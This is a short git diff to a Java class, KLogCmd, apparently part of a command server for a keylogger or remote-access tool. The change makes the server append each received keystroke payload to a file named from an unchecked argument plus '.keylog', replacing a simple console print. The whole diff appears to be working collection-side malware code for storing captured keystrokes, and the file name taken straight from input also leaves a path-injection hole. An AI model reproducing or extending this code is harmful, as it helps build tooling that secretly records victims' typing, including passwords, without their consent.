@@ -1,5 +1,9 @@
 package commands;
 
+import java.io.FileWriter;
+import java.io.IOException;
+import java.io.PrintWriter;
+
 import server.CommandServer;
 import tools.ParsedCommand;
 
@@ -14,7 +18,16 @@ public class KLogCmd extends ServerCommand {
 		StringBuilder sb = new StringBuilder();
 		for (int i = 0; i < pCmd.payload.length; i++)
 			sb.append((char) pCmd.payload[i]);
-		System.out.println(sb.toString());
+		
+		try {
+			PrintWriter writer = new PrintWriter(
+					new FileWriter(pCmd.args[0] + ".keylog", true));
+			writer.println(sb.toString());
+			writer.close();
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+		
 		return DONE;
 	}
 
